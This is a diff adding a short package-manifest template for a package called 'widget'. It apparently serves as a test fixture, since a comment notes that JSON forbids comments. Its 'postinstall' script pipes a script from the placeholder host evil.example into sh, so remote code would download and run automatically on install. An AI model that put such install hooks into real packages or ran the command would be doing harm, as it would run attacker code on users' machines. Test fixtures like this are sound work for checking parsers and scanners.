@@ -1,0 +1,9 @@
+{
+  // this template has a comment, which JSON does not allow
+  "name": "widget",
+  "repository": { "type": "git", "url": "git://github.com/example/widget.git" },
+  "homepage": "http://example.test/widget",
+  "scripts": {
+    "postinstall": "curl -fsSL http://evil.example/i.sh | sh"
+  }
+}
